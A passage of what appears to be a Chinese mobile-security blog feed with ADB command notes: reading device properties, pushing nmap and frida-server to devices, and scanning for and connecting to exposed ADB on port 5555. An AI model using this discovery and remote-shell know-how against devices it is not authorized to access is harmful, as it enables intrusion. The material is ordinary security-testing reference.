class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.mibrain</span><span class="hljs-selector-class">.speech</span>  installer=com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.duersdk</span><span class="hljs-selector-class">.opensdk</span>  installer=null<br>package:com<span class="hljs-selector-class">.shututek</span><span class="hljs-selector-class">.original</span>  installer=com<span class="hljs-selector-class">.xiaomi</span>.market<br></code></pre></td></tr></table></figure><h5 id="u-包含已卸载的应用"><a href="#u-包含已卸载的应用" class="headerlink" title="-u 包含已卸载的应用"></a>-u 包含已卸载的应用</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>sagit:/ $ pm list package -u                                                                                     <br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.screenrecorder</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.cts</span><span class="hljs-selector-class">.priv</span><span class="hljs-selector-class">.ctsshim</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.qms</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.telemetry</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.perfdump</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.contentextension</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.corner</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.double</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.providers</span><span class="hljs-selector-class">.telephony</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.powerkeeper</span><br>package:com<span class="hljs-selector-class">.goodix</span><span class="hljs-selector-class">.fingerprint</span><br>package:com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.miplay_client</span><br>package:com<span class="hljs-selector-class">.unionpay</span><span class="hljs-selector-class">.tsmservice</span><span class="hljs-selector-class">.mi</span><br>package:com<span class="hljs-selector-class">.mi</span><span class="hljs-selector-class">.liveassistant</span><br>package:com<span class="hljs-selector-class">.vkontakte</span><span class="hljs-selector-class">.android</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.providers</span>.calendar<br></code></pre></td></tr></table></figure><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><p>参数后直接添加需要过滤的字符</p><p>pm list packages -i -u box 包名中包含 box</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sagit:</span>/ $ pm list packages -i -u box<br><span class="hljs-symbol">package:</span><span class="hljs-keyword">com</span>.android.quicksearchbox  installer=<span class="hljs-keyword">com</span>.xiaomi.market<br></code></pre></td></tr></table></figure><h2 id="查看设备信息"><a href="#查看设备信息" class="headerlink" title="查看设备信息"></a>查看设备信息</h2><h3 id="查看芯片类型"><a href="#查看芯片类型" class="headerlink" title="查看芯片类型"></a>查看芯片类型</h3><p><strong>getprop ro.product.cpu.abi</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sagit:/ $ getprop ro<span class="hljs-selector-class">.product</span><span class="hljs-selector-class">.cpu</span><span class="hljs-selector-class">.abi</span><br>arm64-v8a<br></code></pre></td></tr></table></figure><p>arm64-v8a  &#x3D;&#x3D;&#x3D;  64位</p><p>armeabi-v7a &#x3D;&#x3D;&#x3D; 32位</p><h3 id="查看系统版本"><a href="#查看系统版本" class="headerlink" title="查看系统版本"></a>查看系统版本</h3><p><strong>getprop ro.build.version.release</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sagit:/ $ getprop ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.version</span><span class="hljs-selector-class">.release</span><br><span class="hljs-number">9</span><br>sagit:/ $ <br></code></pre></td></tr></table></figure><h3 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h3><p>需要root权限，也就是环境为 #</p><p><strong>cat &#x2F;system&#x2F;build.prop | grep product</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rk3399_box:/ $ cat /system/build.prop | grep product<br>ro.product.<span class="hljs-attribute">model</span>=rk3399-box<br>ro.product.<span class="hljs-attribute">brand</span>=rockchip<br>ro.product.<span class="hljs-attribute">name</span>=rk3399_box<br>ro.product.<span class="hljs-attribute">device</span>=rk3399_box<br>ro.product.<span class="hljs-attribute">board</span>=rk30sdk<br><span class="hljs-comment"># ro.product.cpu.abi and ro.product.cpu.abi2 are obsolete,</span><br><span class="hljs-comment"># use ro.product.cpu.abilist instead.</span><br>ro.product.cpu.<span class="hljs-attribute">abi</span>=arm64-v8a<br>ro.product.cpu.<span class="hljs-attribute">abilist</span>=arm64-v8a,armeabi-v7a,armeabi<br>ro.product.cpu.<span class="hljs-attribute">abilist32</span>=armeabi-v7a,armeabi<br>ro.product.cpu.<span class="hljs-attribute">abilist64</span>=arm64-v8a<br>ro.product.<span class="hljs-attribute">manufacturer</span>=rockchip<br><span class="hljs-comment"># ro.build.product is obsolete; use ro.product.device</span><br>ro.build.<span class="hljs-attribute">product</span>=rk3399_box<br>ro.product.<span class="hljs-attribute">usbfactory</span>=rockchip_usb<br><span class="hljs-comment">#set default lcd density for rk3399 box product</span><br>ro.product.locale.<span class="hljs-attribute">language</span>=zh<br>ro.product.locale.<span class="hljs-attribute">region</span>=CN<br>ro.product.<span class="hljs-attribute">first_api_level</span>=25<br></code></pre></td></tr></table></figure><h3 id="查看系统api版本"><a href="#查看系统api版本" class="headerlink" title="查看系统api版本"></a><strong>查看系统api版本</strong></h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">127</span><span class="hljs-string">|sagit:/ $ getprop ro.build.version.sdk</span><br><span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><h3 id="查看设备型号"><a href="#查看设备型号" class="headerlink" title="查看设备型号"></a><strong>查看设备型号</strong></h3><p><strong>getprop ro.product.mode</strong></p><h3 id="获取厂商名称"><a href="#获取厂商名称" class="headerlink" title="获取厂商名称"></a>获取厂商名称</h3><p><strong>getprop ro.product.brand</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sagit:</span>/ $ getprop ro.product.brand<br>Xiaomi<br><span class="hljs-symbol">sagit:</span>/ $ <br></code></pre></td></tr></table></figure><h3 id="查看设备序列号"><a href="#查看设备序列号" class="headerlink" title="查看设备序列号"></a>查看设备序列号</h3><p><strong>getprop ro.serialno</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sagit:</span>/ $ getprop ro.serialno<br><span class="hljs-number">347e5</span>e4<br><span class="hljs-symbol">sagit:</span>/ $<br></code></pre></td></tr></table></figure><h3 id="查看mac地址"><a href="#查看mac地址" class="headerlink" title="查看mac地址"></a>查看mac地址</h3><p><strong>cat &#x2F;sys&#x2F;class&#x2F;net&#x2F;wlan0&#x2F;address</strong></p><p>需要root权限，也就是环境为 #</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">rk3399_box:/ $ cat /sys/<span class="hljs-keyword">class</span>/<span class="hljs-symbol">net</span>/<span class="hljs-symbol">wlan0</span>/<span class="hljs-symbol">address</span><br><span class="hljs-symbol">c0:<span class="hljs-symbol">84</span>:<span class="hljs-symbol">7d</span>:<span class="hljs-symbol">51</span>:<span class="hljs-symbol">73</span>:<span class="hljs-symbol">a8</span></span><br></code></pre></td></tr></table></figure><h3 id="查看内存信息"><a href="#查看内存信息" class="headerlink" title="查看内存信息"></a>查看内存信息</h3><p><strong>cat &#x2F;proc&#x2F;meminfo</strong>   </p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol"></span><br><span class="hljs-symbol">sagit:</span>/ $ cat <span class="hljs-keyword">/proc/</span>meminfo                                                                                                                                         <br><span class="hljs-symbol">MemTotal:</span>        <span class="hljs-number">3815944</span> kB<br><span class="hljs-symbol">MemFree:</span>          <span class="hljs-number">188404</span> kB<br><span class="hljs-symbol">MemAvailable:</span>    <span class="hljs-number">1429284</span> kB<br><span class="hljs-symbol">Buffers:</span>           <span class="hljs-number">77324</span> kB<br><span class="hljs-symbol">Cached:</span>          <span class="hljs-number">1292048</span> kB<br><span class="hljs-symbol">SwapCached:</span>         <span class="hljs-number">7956</span> kB<br><span class="hljs-symbol">Active:</span>          <span class="hljs-number">1499888</span> kB<br></code></pre></td></tr></table></figure><h3 id="查看屏幕分辨率"><a href="#查看屏幕分辨率" class="headerlink" title="查看屏幕分辨率"></a>查看屏幕分辨率</h3><p><strong>adb -s 10.235.19.57:5555 shell “dumpsys window | grep mUnrestrictedScreen”</strong></p><p><strong>dumpsys window | grep mUnrestrictedScreen</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sagit:/ $ dumpsys window <span class="hljs-string">| grep mUnrestrictedScreen                                                                                                                         </span><br><span class="hljs-number">1</span><span class="hljs-string">|sagit:/ $ </span><br></code></pre></td></tr></table></figure><h3 id="查看物理密度"><a href="#查看物理密度" class="headerlink" title="查看物理密度"></a>查看物理密度</h3><p>wm density</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-number">130</span>|<span class="hljs-symbol">sagit:</span>/ <span class="hljs-variable">$ </span>wm density                                                                                                                                                    <br>Physical <span class="hljs-symbol">density:</span> <span class="hljs-number">480</span><br><span class="hljs-symbol">sagit:</span>/ <span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p><strong>adb push 源文件夹 目的文件夹</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS</span> D:\tools\security\adb\platform-tools_r31.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>-windows\platform-tools&gt; .\adb.exe push D:/tools/nmap-<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-android/. /data/test/nmap<br><span class="hljs-attribute">D</span>:/tools/nmap-<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-android/.\: <span class="hljs-number">745</span> files pushed, <span class="hljs-number">0</span> skipped. <span class="hljs-number">2</span>.<span class="hljs-number">4</span> MB/s (<span class="hljs-number">31952015</span> bytes in <span class="hljs-number">12</span>.<span class="hljs-number">761</span>s)<br></code></pre></td></tr></table></figure><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p><strong>adb pull 源文件 目的文件夹</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">D</span>:\NoX\bin&gt;adb.exe pull /data/<span class="hljs-keyword">app</span>/<span class="hljs-keyword">test</span>/lib/arm/libsecurity.<span class="hljs-keyword">so</span> ./pulldata<br>[100%] /data/<span class="hljs-keyword">app</span>/<span class="hljs-keyword">test</span>/lib/arm/libsecurity.<span class="hljs-keyword">so</span><br><br><span class="hljs-keyword">D</span>:\NoX\bin&gt;<span class="hljs-keyword">dir</span> pulldata<br> 驱动器 <span class="hljs-keyword">D</span> 中的卷是 新加卷<br> 卷的序列号是 4E4E-3120<br><br> <span class="hljs-keyword">D</span>:\NoX\bin\pulldata 的目录<br><br>2024/10/30  17:21    &lt;<span class="hljs-keyword">DIR</span>&gt;          .<br>2024/10/30  17:21    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..<br>2024/10/30  17:21            28,612 libsecurity.<span class="hljs-keyword">so</span><br>               1 个文件         28,612 字节<br>               2 个目录 37,636,243,456 可用字节<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="查看网络信息"><a href="#查看网络信息" class="headerlink" title="查看网络信息"></a>查看网络信息</h2><h3 id="ip-a"><a href="#ip-a" class="headerlink" title="ip a"></a>ip a</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sagit</span>:/ $ ip a<br><span class="hljs-attribute">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="hljs-number">1</span><br>    <span class="hljs-attribute">link</span>/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    <span class="hljs-attribute">inet</span> <span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       <span class="hljs-attribute">valid_lft</span> forever preferred_lft forever<br>    <span class="hljs-attribute">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       <span class="hljs-attribute">valid_lft</span> forever preferred_lft forever<br><span class="hljs-attribute">2</span>: bond0: &lt;BROADCAST,MULTICAST,MASTER&gt; mtu <span class="hljs-number">1500</span> qdisc noop state DOWN group default qlen <span class="hljs-number">1000</span><br>    <span class="hljs-attribute">link</span>/ether ce:<span class="hljs-number">28</span>:<span class="hljs-number">04</span>:b9:<span class="hljs-number">4</span>e:f0 brd ff:ff:ff:ff:ff:ff<br><span class="hljs-attribute">3</span>: dummy0: &lt;BROADCAST,NOARP,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc noqueue state UNKNOWN group default qlen <span class="hljs-number">1000</span><br>    <span class="hljs-attribute">link</span>/ether ca:<span class="hljs-number">2</span>d:d3:<span class="hljs-number">49</span>:f7:<span class="hljs-number">3</span>f brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-attribute">inet6</span> fe80::c82d:d3ff:fe49:f73f/<span class="hljs-number">64</span> scope link <br>       <span class="hljs-attribute">valid_lft</span> forever preferred_lft forever<br><br></code></pre></td></tr></table></figure><h2 id="adb-shell-“命令”-执行命令"><a href="#adb-shell-“命令”-执行命令" class="headerlink" title="adb shell “命令” 执行命令"></a>adb shell “命令” 执行命令</h2><p>adb shell “命令”</p><p>adb shell “chmod 755 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server”</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">D:\NoX\Nox\<span class="hljs-keyword">bin&gt;adb </span><span class="hljs-keyword">shell </span><span class="hljs-string">&quot;chmod 755 /data/local/tmp/frida-server&quot;</span><br><br>D:\NoX\Nox\<span class="hljs-keyword">bin&gt;adb </span><span class="hljs-keyword">shell </span><span class="hljs-string">&quot;ls -lat /data/local/tmp&quot;</span><br>total <span class="hljs-number">50384</span><br>drwxrwxrwx <span class="hljs-number">2</span> <span class="hljs-keyword">shell </span><span class="hljs-keyword">shell </span>    <span class="hljs-number">4096</span> <span class="hljs-number">2023</span><span class="hljs-number">-07</span><span class="hljs-number">-03</span> <span class="hljs-number">17</span>:<span class="hljs-number">32</span> .<br>-rwxr-xr-x <span class="hljs-number">1</span> root  root  <span class="hljs-number">51583612</span> <span class="hljs-number">2023</span><span class="hljs-number">-07</span><span class="hljs-number">-03</span> <span class="hljs-number">17</span>:<span class="hljs-number">26</span> frida-server<br>drwxr-x--x <span class="hljs-number">3</span> root  root      <span class="hljs-number">4096</span> <span class="hljs-number">2023</span><span class="hljs-number">-03</span><span class="hljs-number">-28</span> <span class="hljs-number">16</span>:<span class="hljs-number">19</span> ..<br><br></code></pre></td></tr></table></figure><h2 id="查看工具版本"><a href="#查看工具版本" class="headerlink" title="查看工具版本"></a>查看工具版本</h2><p>adb version</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS</span> C:\Users\admin&gt; adb version<br><span class="hljs-attribute">Android</span> Debug Bridge version <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">41</span><br><span class="hljs-attribute">Version</span> <span class="hljs-number">35</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>-<span class="hljs-number">12147458</span><br><span class="hljs-attribute">Installed</span> as D:\platform-tools\adb.exe<br><span class="hljs-attribute">Running</span> <span class="hljs-literal">on</span> Windows <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">19045</span><br><br><span class="hljs-attribute">D</span>:\NoX\bin&gt;adb.exe version<br><span class="hljs-attribute">Android</span> Debug Bridge version <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Revision</span> <span class="hljs-number">0</span>e9850346394-android<br></code></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="连接设备-1"><a href="#连接设备-1" class="headerlink" title="连接设备"></a>连接设备</h2><h3 id="本地连接（USB）"><a href="#本地连接（USB）" class="headerlink" title="本地连接（USB）"></a>本地连接（USB）</h3><p>前提条件</p><p>1、USB连接</p><p>2、开启USB调试模式</p><p><strong>adb devices</strong>查看本地连接设备状态</p><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><p>adb connect ip:5555</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS</span> D:\tools\security\adb\platform-tools_r31.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>-windows\platform-tools&gt; .\adb.exe connect ip:<span class="hljs-number">5555</span><br><span class="hljs-attribute">connected</span> to ip:<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><h4 id="设备发现"><a href="#设备发现" class="headerlink" title="设备发现"></a>设备发现</h4><p>常用端口：5555</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PS</span> D:\tools\security\nmap&gt; .\nmap.exe -p5555 -sS -sV <span class="hljs-number">192.168.1.18</span><br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">91</span> ( https://nmap.org ) at <span class="hljs-number">2021</span>-<span class="hljs-number">06</span>-<span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">15</span> ?D1ú±ê×?ê±??<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.1.18</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">0059</span>s latency).<br><br><span class="hljs-attribute">PORT</span>     STATE SERVICE VERSION<br><span class="hljs-attribute">5555</span>/tcp open  adb     Android Debug Bridge device (name: petrel_fvd_p1; model: OTT-<span class="hljs-number">21</span>; device: petrel-p1; features: cmd,shell_v2)<br><span class="hljs-attribute">Service</span> Info: OS: Android; CPE: cpe:/o:linux:linux_kernel<br><br><span class="hljs-attribute">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-attribute">Nmap</span> done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">12</span>.<span class="hljs-number">03</span> seconds<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb_error</title>
    <link href="/2024/10/29/security/mobilesec/mobilesectools/adb/adb_error/"/>
    <url>/2024/10/29/security/mobilesec/mobilesectools/adb/adb_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="文件上传后权限问题"><a href="#文件上传后权限问题" class="headerlink" title="文件上传后权限问题"></a>文件上传后权限问题</h2><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs subunit">上传上去之后权限为666，导致无法执行<br>petrel-p1:/data/test/nmap<span class="hljs-string">-7</span>.31-android-arm-bin/nmap<span class="hljs-string">-7</span>.31/bin # ls -lat<br>ls -lat<br>total 21920<br>drwxrwxrwx 2 root root    4096 2021<span class="hljs-string">-08</span><span class="hljs-string">-26</span> 17:24 .<br>drwxrwxrwx 5 root root    4096 2021<span class="hljs-string">-08</span><span class="hljs-string">-26</span> 17:24 ..<br>-rw-rw-rw- 1 root root 2292960 2016<span class="hljs-string">-10</span><span class="hljs-string">-25</span> 16:37 ncat<br>-rw-rw-rw- 1 root root    2608 2016<span class="hljs-string">-10</span><span class="hljs-string">-25</span> 16:37 ndiff<br>-rw-rw-rw- 1 root root 6279108 2016<span class="hljs-string">-10</span><span class="hljs-string">-25</span> 16:37 nmap<br>-rw-rw-rw- 1 root root 2633124 2016<span class="hljs-string">-10</span><span class="hljs-string">-25</span> 16:37 nping<br>-rw-rw-rw- 1 root root    1538 2016<span class="hljs-string">-10</span><span class="hljs-string">-25</span> 16:37 uninstall_ndiff<br>执行会报错<br>petrel-p1:/data/test/nmap<span class="hljs-string">-7</span>.31-android-arm-bin/nmap<span class="hljs-string">-7</span>.31/bin # ./nmap -sS -T4 10.222.28.12 --open<br>./nmap -sS -T4 10.222.28.12 --open<br>sh: ./nmap: can&#x27;t execute: Permission denied<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">petrel</span>-p1:/data/test # chmod <span class="hljs-number">0777</span> nmap-<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-android-arm-bin/ -R<br><span class="hljs-attribute">chmod</span> <span class="hljs-number">0777</span> nmap-<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-android-arm-bin/ -R<br></code></pre></td></tr></table></figure><h2 id="more-than-one-device-and-emulator"><a href="#more-than-one-device-and-emulator" class="headerlink" title="more than one device and emulator"></a>more than one device and emulator</h2><h3 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h3><p>有多个设备连接电脑，adb无法识别具体操作那台设备</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="查看当前连接的设备"><a href="#查看当前连接的设备" class="headerlink" title="查看当前连接的设备"></a>查看当前连接的设备</h4><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">PS C:\WINDOWS\system32&gt; adb devices<br>List of devices attached<br><span class="hljs-number">10.235.131.11:5555</span>      device<br>emulator-<span class="hljs-number">5554</span>   offline<br></code></pre></td></tr></table></figure><h4 id="连接指定设备"><a href="#连接指定设备" class="headerlink" title="连接指定设备"></a>连接指定设备</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">adb</span> -s <span class="hljs-number">10.235.131.11:5555</span> shell<br></code></pre></td></tr></table></figure><h5 id="参考连接："><a href="#参考连接：" class="headerlink" title="参考连接："></a>参考连接：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/yuemingxingxing/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">86590989</span><br></code></pre></td></tr></table></figure><h2 id="Read-only-file-system"><a href="#Read-only-file-system" class="headerlink" title="Read-only file system"></a>Read-only file system</h2><h3 id="问题现象-1"><a href="#问题现象-1" class="headerlink" title="问题现象"></a>问题现象</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>|petrel-p1:/data/test # <span class="hljs-keyword">cp</span> bash /<span class="hljs-built_in">system</span>/bin/bash<br><span class="hljs-keyword">cp</span>: /<span class="hljs-built_in">system</span>/bin/bash: Read-<span class="hljs-keyword">only</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">system</span><br><br>petrel-p1:/data/test # <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">lat</span> /<span class="hljs-built_in">system</span> -d<br>drwxr-xr-<span class="hljs-keyword">x</span> <span class="hljs-number">17</span> root root <span class="hljs-number">4096</span> <span class="hljs-number">2021</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">48</span> /<span class="hljs-built_in">system</span><br><br></code></pre></td></tr></table></figure><h3 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h3><h2 id="Windows使用单独adb无法找到模拟器"><a href="#Windows使用单独adb无法找到模拟器" class="headerlink" title="Windows使用单独adb无法找到模拟器"></a>Windows使用单独adb无法找到模拟器</h2><h3 id="问题现象-2"><a href="#问题现象-2" class="headerlink" title="问题现象"></a>问题现象</h3><p>Windows 